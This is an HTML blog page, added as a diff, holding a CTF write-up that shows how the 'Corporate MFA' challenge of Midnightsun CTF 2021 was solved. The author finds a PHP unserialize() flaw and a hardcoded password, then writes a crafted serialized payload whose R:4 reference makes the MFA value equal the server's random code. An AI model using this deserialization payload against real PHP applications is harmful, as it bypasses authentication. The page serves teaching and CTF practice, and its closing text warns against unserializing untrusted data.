@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="In this write-up, I will be going through the Corporate MFA challenge from the Midnightsun CTF 2021 that happened this weekend. This challenge had the goal to bypass an MFA check to retrieve the flag">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bypassing a Super-Secure MFA">
+<meta property="og:url" content="http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/index.html">
+<meta property="og:site_name" content="castilho">
+<meta property="og:description" content="In this write-up, I will be going through the Corporate MFA challenge from the Midnightsun CTF 2021 that happened this weekend. This challenge had the goal to bypass an MFA check to retrieve the flag">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/midnightsun_2021/login_form.png">
+<meta property="og:image" content="http://example.com/images/midnightsun_2021/default_hash.png">
+<meta property="og:image" content="http://example.com/images/midnightsun_2021/flag.png">
+<meta property="article:published_time" content="2021-04-09T23:00:00.000Z">
+<meta property="article:modified_time" content="2021-05-03T13:14:07.469Z">
+<meta property="article:author" content="castilho">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/midnightsun_2021/login_form.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Bypassing a Super-Secure MFA</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&text=Bypassing a Super-Secure MFA"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&title=Bypassing a Super-Secure MFA"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&is_video=false&description=Bypassing a Super-Secure MFA"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Bypassing a Super-Secure MFA&body=Check out this article: http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&title=Bypassing a Super-Secure MFA"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&title=Bypassing a Super-Secure MFA"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&title=Bypassing a Super-Secure MFA"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&title=Bypassing a Super-Secure MFA"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&name=Bypassing a Super-Secure MFA&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&t=Bypassing a Super-Secure MFA"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Corporate-MFA"><span class="toc-number">1.</span> <span class="toc-text">Corporate MFA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Beating-this-Super-Secure-Login"><span class="toc-number">2.</span> <span class="toc-text">Beating this Super-Secure Login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thanks"><span class="toc-number">3.</span> <span class="toc-text">Thanks</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Bypassing a Super-Secure MFA
+    </h1>
+
+
+
+    <div class="meta">
+      <!--<span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">castilho</span>
+      </span>-->
+      
+    <div class="postdate">
+      
+        <time datetime="2021-04-09T23:00:00.000Z" itemprop="datePublished">2021-04-10</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>In this write-up, I will be going through the <strong>Corporate MFA</strong> challenge from the <strong>Midnightsun CTF 2021</strong> that happened this weekend. This challenge had the goal to bypass an MFA check to retrieve the flag by using <strong>PHP Object reference</strong>. Without wasting more time, let’s get started!</p>
+<h3 id="Corporate-MFA"><a href="#Corporate-MFA" class="headerlink" title="Corporate MFA"></a>Corporate MFA</h3><p><strong>How it works</strong></p>
+<p>Accessing the challenge, we’re welcome with the following description. </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The source for this corporate zero-trust multi-factor login portal has been leaked! </span><br><span class="line">Figure out how to defeat the super-secure one-time code.</span><br></pre></td></tr></table></figure>
+
+<p>When checking the website, we’re ( obviously ) faced with a login form, that has 3 inputs: <strong>Username</strong>, <strong>Password</strong>, and <strong>MFA</strong> token.</p>
+<p><img src="/images/midnightsun_2021/login_form.png" alt="Login Form"></p>
+<p>Great, so checking the source code, we find 2 interesting PHP files, <strong>index.php</strong> and <strong>user.php</strong>. Digging throw index.php, we start to see how the login works behind the scenes. When trying to log in, our input ( username, password, and MFA token ) gets <strong>serialized</strong> and returns as a value on a GET <code>userdata</code> parameter.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>)) &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// serialise POST data for easy logging</span></span><br><span class="line">	<span class="variable">$loginAttempt</span> = serialize((<span class="keyword">object</span>)<span class="variable">$_POST</span>); <span class="comment">// &lt;-- Serialized here</span></span><br><span class="line">	header(<span class="string">&#x27;Location: /?userdata=&#x27;</span> . base64_encode(<span class="variable">$loginAttempt</span>)); <span class="comment">// &lt;-- returns as a value here</span></span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>After that, the code checks if the GET parameter <code>userdata</code> exists, base64 decodes our input and sends it to the <strong>verify()</strong> function inside <strong>user.php</strong>.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;userdata&#x27;</span>])) <span class="comment">// &lt;-- Check if parameter exists</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="comment">// check credentials &amp; MFA</span></span><br><span class="line">	<span class="keyword">try</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$user</span> = <span class="keyword">new</span> User(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;userdata&#x27;</span>])); <span class="comment">// &lt;-- Decodes our input</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$user</span>-&gt;verify()) &#123; <span class="comment">// &lt;-- Sends our serialized &#x27;user&#x27; object to verify()</span></span><br><span class="line">			<span class="variable">$notification</span>-&gt;type = <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">			<span class="variable">$notification</span>-&gt;text = <span class="string">&#x27;Congratulations, your flag is: &#x27;</span> . file_get_contents(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;Invalid credentials or MFA token value&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Going into <strong>user.php</strong> we find at the beginning of the file that our ‘user’ object gets <strong>unserialized</strong>. <br>Now, because we control the input, we can exploit this piece of code but more in that later.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$loginAttempt</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;userData = unserialize(<span class="variable">$loginAttempt</span>); <span class="comment">// &lt;-- Vulnerable !!!!</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;userData)</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;Unable to reconstruct user data&#x27;</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Next, inside the <strong>verify()</strong> function, it calls 3 security checks for each of our input : <strong>verifyUsername()</strong>, <strong>verifyPassword()</strong> and <strong>verifyMFA()</strong>. After that, if we’re successful on this 3 checks, we get our flag : </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span>-&gt;verify()) &#123;</span><br><span class="line">    <span class="variable">$notification</span>-&gt;type = <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">    <span class="variable">$notification</span>-&gt;text = <span class="string">&#x27;Congratulations, your flag is: &#x27;</span> . file_get_contents(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Beating-this-Super-Secure-Login"><a href="#Beating-this-Super-Secure-Login" class="headerlink" title="Beating this Super-Secure Login"></a>Beating this Super-Secure Login</h3><p>Now that we know how the login works and have a vulnerable entry point, it’s time to go throw the 3 security checks. </p>
+<p><strong>verifyUsername()</strong></p>
+<p>Checking the function, we see that has a hardcoded username in it :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyUsername</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;userData-&gt;username === <span class="string">&#x27;D0loresH4ze&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>With this, we have our login username <strong>D0loresH4ze</strong>.</p>
+<p><strong>verifyPassword()</strong></p>
+<p>This verification uses <strong>password_verify()</strong> to check our password input against a hash. The bad thing here is that their using a default <strong>hash</strong> that is documented on the <strong>password_verify()</strong> function <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.password-verify.php">manual</a>. Checking the manual, we find that our login password is <strong>rasmuslerdorf</strong>.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyPassword</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> password_verify(<span class="keyword">$this</span>-&gt;userData-&gt;password, <span class="string">&#x27;$2y$07$BCryptRequires22Chrcte/VlQH0piJtjXl.0t1XkA8pw9dMXTpOq&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/midnightsun_2021/default_hash.png" alt="Default Hash"></p>
+<p><strong>verifyMFA()</strong></p>
+<p>Having our credentials <strong>D0loresH4ze</strong>:<strong>rasmuslerdorf</strong>, the only thing left to do is bypass the MFA check.<br>Checking the code, we see that it generates a random number from <strong>1e10</strong> to <strong>1e11 - 1</strong> and compares it against our input.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyMFA</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;userData-&gt;_correctValue = random_int(<span class="number">1e10</span>, <span class="number">1e11</span> - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)<span class="keyword">$this</span>-&gt;userData-&gt;mfa === <span class="keyword">$this</span>-&gt;userData-&gt;_correctValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Now, the value of <strong>1e10</strong> is <code>10000000000</code> and of <strong>1e11 - 1</strong> is <code>99999999999</code>, if we could guess the number between those 2 values, we would be better off guessing the lottery numbers instead of doing CTF’s, so to bypass this verification, <strong>object reference</strong> comes into play!</p>
+<p>Going back to our <strong>serialize</strong> function, by sending the login data :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;D0loresH4ze&amp;password&#x3D;rasmuslerdorf&amp;mfa&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<p>Our serialized data will end up like this :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;stdClass&quot;:3:&#123;s:8:&quot;username&quot;;s:11:&quot;D0loresH4ze&quot;;s:8:&quot;password&quot;;s:13:&quot;rasmuslerdorf&quot;;s:3:&quot;mfa&quot;;s:3:&quot;123&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>This looks a bit confusing, let’s break it down : </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Data type | Value Length  | Value</span><br><span class="line">--------------------------------------------</span><br><span class="line">s:        | 8:            | &quot;username&quot;;</span><br><span class="line">s:        | 11:           | &quot;D0loresH4ze&quot;;</span><br><span class="line">s:        | 8:            | &quot;password&quot;;</span><br><span class="line">s:        | 13:           | &quot;rasmuslerdorf&quot;;</span><br><span class="line">s:        | 3:            | &quot;mfa&quot;;</span><br><span class="line">s:        | 3:            | &quot;123&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>Knowing this, how can we make our <code>mfa</code> have the same value as <code>_correctValue</code> ? <br><br>We can edit our serialized data and reference <code>mfa</code> to the value of <code>_correctValue</code> using the <code>R</code> flag ( you can find more about the serialize structure <a target="_blank" rel="noopener" href="https://topic.alibabacloud.com/a/php-serialization-serialize-format-of-the-detailed_1_34_10040044.html">here</a> ). </p>
+<blockquote>
+<p>r and R represent both object references and pointer references, which are also useful for serializing more complex arrays and objects with data</p>
+</blockquote>
+<p>In short the <code>R</code> flag works like a array index : </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R:2 points to the &quot;username&quot; value</span><br><span class="line">R:3 points to the &quot;password&quot; value</span><br><span class="line">R:4 points to the &quot;_correctValue&quot; value</span><br></pre></td></tr></table></figure>
+
+<p>To make this edits, we can use the following code :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$payload</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$payload</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;D0loresH4ze&quot;</span>;</span><br><span class="line">    <span class="variable">$payload</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;rasmuslerdorf&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload</span>[<span class="string">&#x27;_correctValue&#x27;</span>] = <span class="literal">null</span>;</span><br><span class="line">    <span class="variable">$payload</span>[<span class="string">&#x27;mfa&#x27;</span>] = &amp;<span class="variable">$payload</span>[<span class="string">&#x27;_correctValue&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> serialize((<span class="keyword">object</span>)<span class="variable">$payload</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>O:8:&quot;stdClass&quot;:4:&#123;s:8:&quot;username&quot;;s:11:&quot;D0loresH4ze&quot;;s:8:&quot;password&quot;;s:13:&quot;rasmuslerdorf&quot;;s:13:&quot;_correctValue&quot;;N;s:3:&quot;mfa&quot;;R:4;&#125;</code></p>
+<p>Organizing our serialized data, will end up like this :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Data type | Value Length  | Value</span><br><span class="line">--------------------------------------------</span><br><span class="line">s:        | 8:            | &quot;username&quot;;</span><br><span class="line">s:        | 11:           | &quot;D0loresH4ze&quot;;</span><br><span class="line">s:        | 8:            | &quot;password&quot;;</span><br><span class="line">s:        | 13:           | &quot;rasmuslerdorf&quot;;</span><br><span class="line">s:        | 13:           | &quot;_correctValue&quot;;</span><br><span class="line">nothing   | nothing       | N; &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;|</span><br><span class="line">s:        | 3:            | &quot;mfa&quot;;            | &quot;mfa&quot; getting the value of &quot;_correctValue&quot;</span><br><span class="line">R:        | nothing       | 4; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;|</span><br></pre></td></tr></table></figure>
+
+<p>Changes we’ve made to the payload :</p>
+<ul>
+<li><p>Add the variable <code>_correctValue</code>  with a random value ( <code>N</code> is just a Null value ) because it will be overwritten anyway like we can see here :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;userData-&gt;_correctValue = random_int(<span class="number">1e10</span>, <span class="number">1e11</span> - <span class="number">1</span>);</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ul>
+<li>Changing the value of <code>mfa</code> to reference the value of <code>_correctValue</code> with <code>R:4</code></li>
+</ul>
+<p>Now with our final payload in place, we just have to base64 encode it and change the value of the <code>userdata</code> parameter to our payload. Once sent, we retrieve our flag :)</p>
+<p><img src="/images/midnightsun_2021/flag.png" alt="Flag"></p>
+<h3 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h3><p>From this write-up, we learned the dangers of the function <strong>unserialized</strong> in PHP and why we shouldn’t use it with untrusted data.<br>I would also like to mention my teammate <a target="_blank" rel="noopener" href="https://maxdamage.dev/">Max</a> as we took down this challenge together.</p>
+<p>That’s it, thank you for reading, best regards, Castilho.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Corporate-MFA"><span class="toc-number">1.</span> <span class="toc-text">Corporate MFA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Beating-this-Super-Secure-Login"><span class="toc-number">2.</span> <span class="toc-text">Beating this Super-Secure Login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thanks"><span class="toc-number">3.</span> <span class="toc-text">Thanks</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&text=Bypassing a Super-Secure MFA"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&title=Bypassing a Super-Secure MFA"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&is_video=false&description=Bypassing a Super-Secure MFA"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Bypassing a Super-Secure MFA&body=Check out this article: http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&title=Bypassing a Super-Secure MFA"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&title=Bypassing a Super-Secure MFA"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&title=Bypassing a Super-Secure MFA"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&title=Bypassing a Super-Secure MFA"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&name=Bypassing a Super-Secure MFA&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/10/Bypassing-a-Super-Secure-MFA/&t=Bypassing a Super-Secure MFA"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021
+    castilho
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
